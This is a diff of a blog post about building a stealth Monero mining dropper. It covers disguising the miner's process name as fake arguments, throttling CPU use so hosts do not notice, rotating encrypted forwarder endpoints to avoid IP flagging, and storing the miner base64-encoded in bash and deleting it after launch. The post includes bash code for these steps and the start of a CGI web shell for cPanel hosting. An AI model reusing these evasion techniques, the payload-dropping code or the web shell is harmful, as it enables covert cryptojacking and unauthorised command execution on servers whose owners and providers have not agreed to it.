 <li><p>shuffle the elements of the tail of the string &#40;all except the first&#41; to get a diverse process command. Now we have a string looking like <code>cmd --arg2 --arg1 --arg3</code>. This is our miner mask, we run the binary <em>without</em> arguments, but it looks like we started a command <code>cmd</code> with arguments <code>--arg1 --arg2 --arg3</code>. Spaces and dashes are allowed in file names, so it is fine to run a binary named like this, it doesn&#39;t seem linux discerns between the executable and the arguments when storing the process commands.</p>
 <p>The miner configuration is automatically loaded from <code>&#36;PWD</code>.</p>
-</li>
+
 </ul>
-<h3 id="hashrate"><a href="#hashrate" class="header-anchor">Hashrate</a></h3>
-<p>, with time, the upstream miner got many <strong>automatic tuning</strong> features, so it made part of my scripts redundant, but the difference between upstream and downstream here is that the upstream goal is to maximize <em>performance</em>, while our goal is to maximize <em>efficiency and obfuscation</em>, we do not want to overtake the system, we want to leech a little bit without service disruption. <sup id="fnref:monerominer"><a href="#fndef:monerominer" class="fnref">[3]</a></sup></p>
+<h3 id=hashrate ><a href="#hashrate" class=header-anchor >Hashrate</a></h3>
+<p>, with time, the upstream miner got many <strong>automatic tuning</strong> features, so it made part of my scripts redundant, but the difference between upstream and downstream here is that the upstream goal is to maximize <em>performance</em>, while our goal is to maximize <em>efficiency and obfuscation</em>, we do not want to overtake the system, we want to leech a little bit without service disruption. <sup id="fnref:monerominer"><a href="#fndef:monerominer" class=fnref >[3]</a></sup></p>
 <p>For this, we need a more granular understanding of the environment, the <code>l2/l3</code> cache structure of the processor, ram, and cores, and current processor <em>average</em> load and cpu <em>usage</em>. I attempted to build a <a href="https://en.wikipedia.org/wiki/Finite-state_machine">state machine</a> in bash that would start from the bare minimum and try different configurations slowly settling on the average best. It was a <strong>huge</strong> waste of effort littered with <a href="https://en.wikipedia.org/wiki/Technical_debt">technical debt</a> that went bankrupt very quickly and was mostly discarded, with just remnants lingering in the codebase.</p>
-<p>Frack all this auto tuning jumbo, we just made the miner sleep depending on host usage/load, this required miner modifications to <code>sleep</code> between threads yields, and a few fixes to the configuration watchdog <sup id="fnref:configwatch"><a href="#fndef:configwatch" class="fnref">[4]</a></sup>, which would allow us to reload the sleeping amount at runtime. The logic is much more simplified and looks like this:</p>
+<p>Frack all this auto tuning jumbo, we just made the miner sleep depending on host usage/load, this required miner modifications to <code>sleep</code> between threads yields, and a few fixes to the configuration watchdog <sup id="fnref:configwatch"><a href="#fndef:configwatch" class=fnref >[4]</a></sup>, which would allow us to reload the sleeping amount at runtime. The logic is much more simplified and looks like this:</p>
 <ul>
 <li><p>if usage is above/below &#36;TARGET_USAGE &#40;± margin of error&#41; increase/decrease sleep</p>
-</li>
+
 <li><p>if average load within <code>1m</code> is above/below &#36;TARGET_LOAD pause/resume mining</p>
-</li>
+
 </ul>
-<h3 id="connection"><a href="#connection" class="header-anchor">Connection</a></h3>
+<h3 id=connection ><a href="#connection" class=header-anchor >Connection</a></h3>
 <p>In our bash roundup we showed utilities for connection. Why do we need these? Because we need diversity; simply hard coding an endpoint into the configuration won&#39;t last long, when something looks suspicious, and has network activity, IPs are flagged.</p>
 <p>At the start we experimented with a couple of methods:</p>
 <ul>
 <li><p>using <a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains">proxychains</a> to overload the miner network calls, but it required the miner to be built with dinamic libraries, and you had to ship them with the payload, so it was impractical.</p>
-</li>
+
 <li><p>running a <a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost">forward tunnel</a> side by side with the miner: this had a lot of configuration overhead, as now we were configuring two processes on each deployment, which amounted to more bugs.</p>
-</li>
+
 </ul>
 <p>At the end we settled with just shipping a list of endpoints, stored in an bash variables, picking one at random. Connections were of course encrypted. What are these endpoints? Forwarders to the proxy which would handle the miners jobs.</p>
 
 <img src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png" alt="">
-<p>Why do we need a <a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy">mining proxy</a>? I never really went past ~100 concurrent connections, so a proxy was not really necessary for network load, but it was convenient for negotiating the hashing algorithm, and to provide different difficulty targets to different miners, to prevent miners from working on <strong>difficulty</strong> targets that would take them too much time to complete and avoid the risk of wasting computation on unfinished jobs. <sup id="fnref:difficulty"><a href="#fndef:difficulty" class="fnref">[5]</a></sup> The pool software also required a few modifications as it was happily advertising to be a proxy on plain http requests...<em>that had to be timed-out</em>, and a fork added access control so we based our mods on that. <sup id="fnref:stratumprotocol"><a href="#fndef:stratumprotocol" class="fnref">[6]</a></sup></p>
-<h3 id="editing_json"><a href="#editing_json" class="header-anchor">Editing json</a></h3>
-<p>Applying modifications to a json file with just bash we got by with some env var substitution, and some regex. Initially we were relying on an <code>envsubst</code> binary to apply variables, then we went full bash <sup id="fnref:fullbash"><a href="#fndef:fullbash" class="fnref">[7]</a></sup> with this logic:</p>
+<p>Why do we need a <a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy">mining proxy</a>? I never really went past ~100 concurrent connections, so a proxy was not really necessary for network load, but it was convenient for negotiating the hashing algorithm, and to provide different difficulty targets to different miners, to prevent miners from working on <strong>difficulty</strong> targets that would take them too much time to complete and avoid the risk of wasting computation on unfinished jobs. <sup id="fnref:difficulty"><a href="#fndef:difficulty" class=fnref >[5]</a></sup> The pool software also required a few modifications as it was happily advertising to be a proxy on plain http requests...<em>that had to be timed-out</em>, and a fork added access control so we based our mods on that. <sup id="fnref:stratumprotocol"><a href="#fndef:stratumprotocol" class=fnref >[6]</a></sup></p>
+<h3 id=editing_json ><a href="#editing_json" class=header-anchor >Editing json</a></h3>
+<p>Applying modifications to a json file with just bash we got by with some env var substitution, and some regex. Initially we were relying on an <code>envsubst</code> binary to apply variables, then we went full bash <sup id="fnref:fullbash"><a href="#fndef:fullbash" class=fnref >[7]</a></sup> with this logic:</p>
 <ul>
 <li><p>read config template</p>
-</li>
+
 <li><p>replace all quotes with a very esoteric string &#40;like <code>_#_#</code>&#41;</p>
-</li>
+
 <li><p><code>eval</code> the template</p>
-</li>
+
 <li><p>replace all the esoteric occurrences back with quotes</p>
-</li>
+
 </ul>
 <p>Apart from avoiding sub processes, another advantage is that we get complete bash capabilities in our templates. For reading and writing without templates, we have to rely on bash regex capabilities:</p>
-<pre><code class="bash hljs">cc_rgx=<span class="hljs-string">&#x27;( *&quot;.*?&quot; *: *)(&quot;(.*?)&quot;|([^,]*?)) *(,|.*?\/\/.*?|\n|$)&#x27;</span>
-<span class="hljs-function"><span class="hljs-title">change_config</span></span>() {
-	<span class="hljs-built_in">local</span> subs
-	<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span>
-		<span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">${l/\&quot;*$1*\&quot;*:/}</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-			[[ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> =~ <span class="hljs-variable">$cc_rgx</span> ]]
-			matches=(<span class="hljs-string">&quot;<span class="hljs-variable">${BASH_REMATCH[@]}</span>&quot;</span>)
-			[ -n <span class="hljs-string">&quot;<span class="hljs-variable">${matches[3]}</span>&quot;</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">${2:0:1}</span>&quot;</span> != <span class="hljs-string">&quot;\&quot;&quot;</span> ] &amp;&amp;
-				subs=<span class="hljs-string">&quot;\&quot;<span class="hljs-variable">$2</span>\&quot;&quot;</span> ||
-				subs=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>
-			CONFIG=<span class="hljs-variable">${CONFIG/<span class="hljs-variable">${matches[0]}</span>/<span class="hljs-variable">${matches[1]}</span>$subs<span class="hljs-variable">${matches[5]}</span>}</span>
-			<span class="hljs-built_in">break</span>
-		<span class="hljs-keyword">fi</span>
-	<span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;%s&#x27; <span class="hljs-string">&quot;<span class="hljs-variable">$CONFIG</span>&quot;</span> 2&gt;/dev/null)</span>&quot;</span>
+<pre><code class="bash hljs">cc_rgx=<span class=hljs-string >&#x27;( *&quot;.*?&quot; *: *)(&quot;(.*?)&quot;|([^,]*?)) *(,|.*?\/\/.*?|\n|$)&#x27;</span>
+<span class=hljs-function ><span class=hljs-title >change_config</span></span>() {
+	<span class=hljs-built_in >local</span> subs
+	<span class=hljs-keyword >while</span> <span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span>
+		<span class=hljs-keyword >if</span> [ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> != <span class=hljs-string >&quot;<span class=hljs-variable >${l/\&quot;*$1*\&quot;*:/}</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+			[[ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> =~ <span class=hljs-variable >$cc_rgx</span> ]]
+			matches=(<span class=hljs-string >&quot;<span class=hljs-variable >${BASH_REMATCH[@]}</span>&quot;</span>)
+			[ -n <span class=hljs-string >&quot;<span class=hljs-variable >${matches[3]}</span>&quot;</span> -a <span class=hljs-string >&quot;<span class=hljs-variable >${2:0:1}</span>&quot;</span> != <span class=hljs-string >&quot;\&quot;&quot;</span> ] &amp;&amp;
+				subs=<span class=hljs-string >&quot;\&quot;<span class=hljs-variable >$2</span>\&quot;&quot;</span> ||
+				subs=<span class=hljs-string >&quot;<span class=hljs-variable >$2</span>&quot;</span>
+			CONFIG=<span class=hljs-variable >${CONFIG/<span class=hljs-variable >${matches[0]}</span>/<span class=hljs-variable >${matches[1]}</span>$subs<span class=hljs-variable >${matches[5]}</span>}</span>
+			<span class=hljs-built_in >break</span>
+		<span class=hljs-keyword >fi</span>
+	<span class=hljs-keyword >done</span> &lt;&lt;&lt;<span class=hljs-string >&quot;<span class=hljs-subst >$(printf &#x27;%s&#x27; <span class=hljs-string >&quot;<span class=hljs-variable >$CONFIG</span>&quot;</span> 2&gt;/dev/null)</span>&quot;</span>
 }
 
-<span class="hljs-comment">## output miner config value $1 unquoted</span>
-gc_rgx=<span class="hljs-string">&#x27; *&quot;[^:]+&quot; *: *(&quot;(.*?)&quot;|([^,]*)) *(,|.*?\/\/.*?|\n|$)&#x27;</span>
-<span class="hljs-function"><span class="hljs-title">get_config</span></span>() {
-	<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span>
-		<span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">${l/\&quot;*$1*\&quot;*:/}</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-			[[ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> =~ <span class="hljs-variable">$gc_rgx</span> ]]
-			[ -n <span class="hljs-string">&quot;<span class="hljs-variable">${BASH_REMATCH[2]}</span>&quot;</span> ] &amp;&amp;
-				<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">${BASH_REMATCH[2]}</span>&quot;</span> ||
-				<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">${BASH_REMATCH[3]}</span>&quot;</span>
-			<span class="hljs-built_in">break</span>
-		<span class="hljs-keyword">fi</span>
-	<span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-subst">$(printf &#x27;%s&#x27; <span class="hljs-string">&quot;<span class="hljs-variable">$CONFIG</span>&quot;</span> 2&gt;/dev/null)</span>&quot;</span>
+<span class=hljs-comment >## output miner config value $1 unquoted</span>
+gc_rgx=<span class=hljs-string >&#x27; *&quot;[^:]+&quot; *: *(&quot;(.*?)&quot;|([^,]*)) *(,|.*?\/\/.*?|\n|$)&#x27;</span>
+<span class=hljs-function ><span class=hljs-title >get_config</span></span>() {
+	<span class=hljs-keyword >while</span> <span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span>
+		<span class=hljs-keyword >if</span> [ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> != <span class=hljs-string >&quot;<span class=hljs-variable >${l/\&quot;*$1*\&quot;*:/}</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+			[[ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> =~ <span class=hljs-variable >$gc_rgx</span> ]]
+			[ -n <span class=hljs-string >&quot;<span class=hljs-variable >${BASH_REMATCH[2]}</span>&quot;</span> ] &amp;&amp;
+				<span class=hljs-built_in >printf</span> <span class=hljs-string >&#x27;%s&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >${BASH_REMATCH[2]}</span>&quot;</span> ||
+				<span class=hljs-built_in >printf</span> <span class=hljs-string >&#x27;%s&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >${BASH_REMATCH[3]}</span>&quot;</span>
+			<span class=hljs-built_in >break</span>
+		<span class=hljs-keyword >fi</span>
+	<span class=hljs-keyword >done</span> &lt;&lt;&lt;<span class=hljs-string >&quot;<span class=hljs-subst >$(printf &#x27;%s&#x27; <span class=hljs-string >&quot;<span class=hljs-variable >$CONFIG</span>&quot;</span> 2&gt;/dev/null)</span>&quot;</span>
 }</code></pre>
 <p>This only allows us to edit single lines, for multi-line entries it just considers the first line..but it is good enough for our use case.</p>
-<h2 id="runtime"><a href="#runtime" class="header-anchor">Runtime</a></h2>
+<h2 id=runtime ><a href="#runtime" class=header-anchor >Runtime</a></h2>
 <p>What does our runtime look like? We have a main bash process that executes the main loop, then the miner sub-process, the cpu monitor sub-process, the locker and the tuner. That&#39;s almost a handful.</p>
 <p>First we want to ensure that if something goes wrong, we don&#39;t leave a mess, this means that we use a bash trap to perform cleanups on termination</p>
-<pre><code class="bash hljs"><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10&quot;</span> SIGINT EXIT SIGKILL SIGTERM</code></pre>
+<pre><code class="bash hljs"><span class=hljs-built_in >trap</span> <span class=hljs-string >&quot;trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10&quot;</span> SIGINT EXIT SIGKILL SIGTERM</code></pre>
 <p><code>trap - ...</code> unsets the trap to prevent recursion. The trap kills all the jobs and removes the working environment.</p>
-<p>It&#39;s time to start the miner, which is stored as a bash variable in base64 encoding. We dump it on the filesystem, then we dump the config, execute the miner, and remove both the miner and the config. On linux you can remove the executable of a running process, &#40;on windows this is not allowed&#41;. <sup id="fnref:memoryondemand"><a href="#fndef:memoryondemand" class="fnref">[8]</a></sup> When the miner is running, on the filesystem there is just a <code>.. /</code> directory with a <code>b64</code> link in it.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## put a file $1 into a var $2</span>
-<span class="hljs-function"><span class="hljs-title">fileToVar</span></span>(){
-    <span class="hljs-built_in">declare</span> -n tmpd=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span> &amp;&amp; tmpd=$(b64e <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>) &amp;&amp; <span class="hljs-built_in">return</span>
-    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$tmpd</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-        <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;gobbling in array&quot;</span>
-        <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-variable">$2</span>=1&quot;</span> <span class="hljs-comment">## avoid empty checks</span>
-        gobbled[<span class="hljs-variable">$2</span>]=$(b64e <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>)
-    <span class="hljs-keyword">else</span>
-        <span class="hljs-built_in">return</span> 1 <span class="hljs-comment">## do not quote assignment otherwise ram is not released</span>
-    <span class="hljs-keyword">fi</span>
+<p>It&#39;s time to start the miner, which is stored as a bash variable in base64 encoding. We dump it on the filesystem, then we dump the config, execute the miner, and remove both the miner and the config. On linux you can remove the executable of a running process, &#40;on windows this is not allowed&#41;. <sup id="fnref:memoryondemand"><a href="#fndef:memoryondemand" class=fnref >[8]</a></sup> When the miner is running, on the filesystem there is just a <code>.. /</code> directory with a <code>b64</code> link in it.</p>
+<pre><code class="bash hljs"><span class=hljs-comment >## put a file $1 into a var $2</span>
+<span class=hljs-function ><span class=hljs-title >fileToVar</span></span>(){
+    <span class=hljs-built_in >declare</span> -n tmpd=<span class=hljs-string >&quot;<span class=hljs-variable >$2</span>&quot;</span> &amp;&amp; tmpd=$(b64e <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span>) &amp;&amp; <span class=hljs-built_in >return</span>
+    <span class=hljs-keyword >if</span> [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$tmpd</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+        <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;gobbling in array&quot;</span>
+        <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;<span class=hljs-variable >$2</span>=1&quot;</span> <span class=hljs-comment >## avoid empty checks</span>
+        gobbled[<span class=hljs-variable >$2</span>]=$(b64e <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span>)
+    <span class=hljs-keyword >else</span>
+        <span class=hljs-built_in >return</span> 1 <span class=hljs-comment >## do not quote assignment otherwise ram is not released</span>
+    <span class=hljs-keyword >fi</span>
 }
-<span class="hljs-comment">## put a var $1 into a file $2</span>
-<span class="hljs-function"><span class="hljs-title">varToFile</span></span>(){
-    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$VERBOSE</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-        <span class="hljs-keyword">if</span> <span class="hljs-built_in">declare</span> -n 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span> &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;b64d &lt;&lt;&lt;\&quot;\$<span class="hljs-variable">$1</span>\&quot; 1&gt;\&quot;<span class="hljs-variable">$2</span>\&quot; 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span>&quot;</span>; <span class="hljs-keyword">then</span>
-            <span class="hljs-built_in">return</span>
-        <span class="hljs-keyword">else</span>
-            <span class="hljs-comment"># log &quot;dumping from array&quot;</span>
-            <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;b64d &lt;&lt;&lt;\&quot;\${gobbled[<span class="hljs-variable">$1</span>]}\&quot; 1&gt;\&quot;<span class="hljs-variable">$2</span>\&quot; 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span>
-        <span class="hljs-keyword">fi</span>
-        <span class="hljs-built_in">return</span> 1
-    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">declare</span> -n &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;b64d &lt;&lt;&lt;\&quot;\$<span class="hljs-variable">$1</span>\&quot; &gt;\&quot;<span class="hljs-variable">$2</span>\&quot;&quot;</span>; <span class="hljs-keyword">then</span>
-             <span class="hljs-built_in">return</span>
-         <span class="hljs-keyword">else</span>
-             <span class="hljs-comment"># log &quot;dumping from array&quot;</span>
-             <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;b64d &lt;&lt;&lt;\&quot;\${gobbled[<span class="hljs-variable">$1</span>]}\&quot; &gt;\&quot;<span class="hljs-variable">$2</span>\&quot;&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span>
-         <span class="hljs-keyword">fi</span>
-         <span class="hljs-built_in">return</span> 1
-    <span class="hljs-keyword">fi</span>
+<span class=hljs-comment >## put a var $1 into a file $2</span>
+<span class=hljs-function ><span class=hljs-title >varToFile</span></span>(){
+    <span class=hljs-keyword >if</span> [ -n <span class=hljs-string >&quot;<span class=hljs-variable >$VERBOSE</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+        <span class=hljs-keyword >if</span> <span class=hljs-built_in >declare</span> -n 2&gt;&gt;<span class=hljs-variable >${VERBOSE}</span> &amp;&amp; <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;b64d &lt;&lt;&lt;\&quot;\$<span class=hljs-variable >$1</span>\&quot; 1&gt;\&quot;<span class=hljs-variable >$2</span>\&quot; 2&gt;&gt;<span class=hljs-variable >${VERBOSE}</span>&quot;</span>; <span class=hljs-keyword >then</span>
+            <span class=hljs-built_in >return</span>
+        <span class=hljs-keyword >else</span>
+            <span class=hljs-comment ># log &quot;dumping from array&quot;</span>
+            <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;b64d &lt;&lt;&lt;\&quot;\${gobbled[<span class=hljs-variable >$1</span>]}\&quot; 1&gt;\&quot;<span class=hljs-variable >$2</span>\&quot; 2&gt;&gt;<span class=hljs-variable >${VERBOSE}</span>&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span>
+        <span class=hljs-keyword >fi</span>
+        <span class=hljs-built_in >return</span> 1
+    <span class=hljs-keyword >else</span> <span class=hljs-keyword >if</span> <span class=hljs-built_in >declare</span> -n &amp;&amp; <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;b64d &lt;&lt;&lt;\&quot;\$<span class=hljs-variable >$1</span>\&quot; &gt;\&quot;<span class=hljs-variable >$2</span>\&quot;&quot;</span>; <span class=hljs-keyword >then</span>
+             <span class=hljs-built_in >return</span>
+         <span class=hljs-keyword >else</span>
+             <span class=hljs-comment ># log &quot;dumping from array&quot;</span>
+             <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;b64d &lt;&lt;&lt;\&quot;\${gobbled[<span class=hljs-variable >$1</span>]}\&quot; &gt;\&quot;<span class=hljs-variable >$2</span>\&quot;&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span>
+         <span class=hljs-keyword >fi</span>
+         <span class=hljs-built_in >return</span> 1
+    <span class=hljs-keyword >fi</span>
 }</code></pre>
 <p>A maddening quirk encountered with bash while encoding the miner is that assigning a variable with a subshell with quotes <code>myvar&#61;&quot;&#36;&#40;something&#41;&quot;</code> causes a permanent increase in memory usage, this was hard to debug and haven&#39;t really found the reason why behaves like this, anyway the assignment has to be unquoted. Decoding instead is done with <em>herestrings</em> which is an abstraction over temporary files, the variable is dumped into a file that is then piped back into the process.</p>
 <p>The miner long running loop:</p>
@@ -515,11 +369,11 @@ gc_rgx=<span class="hljs-string">&#x27; *&quot;[^:]+&quot; *: *(&quot;(.*?)&quot
 <li><p>while true</p>
 <ul>
 <li><p>stop miner</p>
-</li>
+
 <li><p>remove config</p>
-</li>
+
 <li><p>start miner</p>
-</li>
+
 <li><p>while true</p>
 <ul>
 <li><p>start daemon</p>
@@ -527,401 +381,397 @@ gc_rgx=<span class="hljs-string">&#x27; *&quot;[^:]+&quot; *: *(&quot;(.*?)&quot
 <li><p>while miner is running</p>
 <ul>
 <li><p>read the output from miner</p>
-</li>
+
 <li><p>choose miner action based on output line</p>
-</li>
+
 </ul>
-</li>
+
 </ul>
-</li>
+
 <li><p>if miner is not running: break</p>
-</li>
+
 </ul>
-</li>
+
 <li><p>sleep</p>
-</li>
+
 </ul>
-</li>
+
 </ul>
 <p>The output line is matched against some regex:</p>
-<pre><code class="bash hljs">act_rgx=<span class="hljs-string">&#x27;(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \&quot;\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled&#x27;</span></code></pre>
+<pre><code class="bash hljs">act_rgx=<span class=hljs-string >&#x27;(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \&quot;\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled&#x27;</span></code></pre>
 <p>The daemon handles cases where</p>
 <ul>
 <li><p>the connection to the endpoint gives errors &#40;pick a new random endpoint&#41;</p>
-</li>
+
 <li><p>the hashing algorithm changes &#40;adjust sleep time and ad-hoc configurations&#41;</p>
-</li>
+
 <li><p>miner problems &#40;restart the miner&#41;.</p>
-</li>
+
 </ul>
 <p>For a while there was support for the command and control dashboard, which allowed to trigger manual restarts, however since its usage was minimal it was discarded, and its endpoints were replaced with an alternative pool connection, also the restart process was unstable, complex...another instance of tech debt. However it allowed to re-fetch an updated payload and re-setup all configurations on the fly, which was pretty cool, the ultimate trampoline.</p>
-<h2 id="debugging"><a href="#debugging" class="header-anchor">Debugging</a></h2>
+<h2 id=debugging ><a href="#debugging" class=header-anchor >Debugging</a></h2>
 <p>There are three main utilities</p>
 <ul>
 <li><p>enable/disable tracing around code blocks &#40;we don&#39;t want to trace a b64 encoded binary in a variable..&#41;</p>
-</li>
+
 <li><p>a simple function for formatting logs</p>
-</li>
+
 <li><p>a flag that would activate verbose logging at runtime whenever the miner was started.</p>
 <ul>
 <li><p>does the file <code>.debug</code> exist?</p>
 <ul>
 <li><p>enable verbose logging</p>
-</li>
+
 </ul>
-</li>
+
 </ul>
-</li>
+
 </ul>
-<h2 id="target_deployments"><a href="#target_deployments" class="header-anchor">Target deployments</a></h2>
+<h2 id=target_deployments ><a href="#target_deployments" class=header-anchor >Target deployments</a></h2>
 <p>This setup has been tested on 3 kind of hosts:</p>
-<h3 id="self_hosted_containers_or_vms"><a href="#self_hosted_containers_or_vms" class="header-anchor">Self hosted containers or VMs</a></h3>
+<h3 id=self_hosted_containers_or_vms ><a href="#self_hosted_containers_or_vms" class=header-anchor >Self hosted containers or VMs</a></h3>
 <p>Many hosting providers don&#39;t like mining since CPU resources tend to be shared among multiple users, and mining software can easily slow down a host node impacting performance for the rest of the users. This can true even if CPU user time is unlimited, because hashing algorithms can saturate all the caching layers of the CPU if the cache is shared among all the CPU cores.</p>
 <p>We would like to use our <em>fair</em> share of resources without getting banned, that&#39;s a good use-case for our stealth dropper since it is host usage aware, which means it <em>should</em> stay kind of within &#91;AUP&#93;. There is no extra steps when dealing with self hosted deployments, just the launcher script, maybe added to the boot sequence or launched manually.</p>
-<h3 id="cpanel_based_web_hosting"><a href="#cpanel_based_web_hosting" class="header-anchor">cPanel based web hosting</a></h3>
-<p>Web hosting subscriptions plans are mostly offered through &#91;cPanel&#93;. Again here we are using personal subscription plans which have reasonable resource limits, on the other hand any free plan has ridiculous limits <sup id="fnref:freehostinglimits"><a href="#fndef:freehostinglimits" class="fnref">[9]</a></sup>. cPanel allows you to define handlers for different file extensions, this allows us to execute shell scripts through the <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">cgi</a> with an http request against a shell script uploaded on the server. These kind of interfaces are what web-shells look like <sup id="fnref:cpanelssh"><a href="#fndef:cpanelssh" class="fnref">[10]</a></sup>. A simple bash web shell</p>
-<pre><code class="bash hljs"><span class="hljs-comment"># without content encoding the request response won&#x27;t be honored</span>
-<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;Content-Type: text/plain\n&#x27;</span>
+<h3 id=cpanel_based_web_hosting ><a href="#cpanel_based_web_hosting" class=header-anchor >cPanel based web hosting</a></h3>
+<p>Web hosting subscriptions plans are mostly offered through &#91;cPanel&#93;. Again here we are using personal subscription plans which have reasonable resource limits, on the other hand any free plan has ridiculous limits <sup id="fnref:freehostinglimits"><a href="#fndef:freehostinglimits" class=fnref >[9]</a></sup>. cPanel allows you to define handlers for different file extensions, this allows us to execute shell scripts through the <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">cgi</a> with an http request against a shell script uploaded on the server. These kind of interfaces are what web-shells look like <sup id="fnref:cpanelssh"><a href="#fndef:cpanelssh" class=fnref >[10]</a></sup>. A simple bash web shell</p>
+<pre><code class="bash hljs"><span class=hljs-comment ># without content encoding the request response won&#x27;t be honored</span>
+<span class=hljs-built_in >echo</span> -e <span class=hljs-string >&#x27;Content-Type: text/plain\n&#x27;</span>
 SERVER_NAME=myserver
-<span class="hljs-comment">## parse vars (for interactive use)</span>
-saveIFS=<span class="hljs-variable">$IFS</span>
-IFS=<span class="hljs-string">&#x27;=&amp;&#x27;</span>
-parm=(<span class="hljs-variable">$QUERY_STRING</span>)
-IFS=<span class="hljs-variable">$saveIFS</span>
-<span class="hljs-keyword">for</span> ((i=0; i&lt;<span class="hljs-variable">${#parm[@]}</span>; i+=2))
-<span class="hljs-keyword">do</span>
-    <span class="hljs-built_in">declare</span> var_<span class="hljs-variable">${parm[i]}</span>=<span class="hljs-variable">${parm[i+1]}</span>
-<span class="hljs-keyword">done</span>
-<span class="hljs-comment">## exec command for interactive and proclimited scenarios</span>
-url_encoded=<span class="hljs-string">&quot;<span class="hljs-variable">${var_path//+/ }</span>&quot;</span>
-<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;.:<span class="hljs-variable">$PATH</span>&quot;</span>
+<span class=hljs-comment >## parse vars (for interactive use)</span>
+saveIFS=<span class=hljs-variable >$IFS</span>
+IFS=<span class=hljs-string >&#x27;=&amp;&#x27;</span>
+parm=(<span class=hljs-variable >$QUERY_STRING</span>)
+IFS=<span class=hljs-variable >$saveIFS</span>
+<span class=hljs-keyword >for</span> ((i=0; i&lt;<span class=hljs-variable >${#parm[@]}</span>; i+=2))
+<span class=hljs-keyword >do</span>
+    <span class=hljs-built_in >declare</span> var_<span class=hljs-variable >${parm[i]}</span>=<span class=hljs-variable >${parm[i+1]}</span>
+<span class=hljs-keyword >done</span>
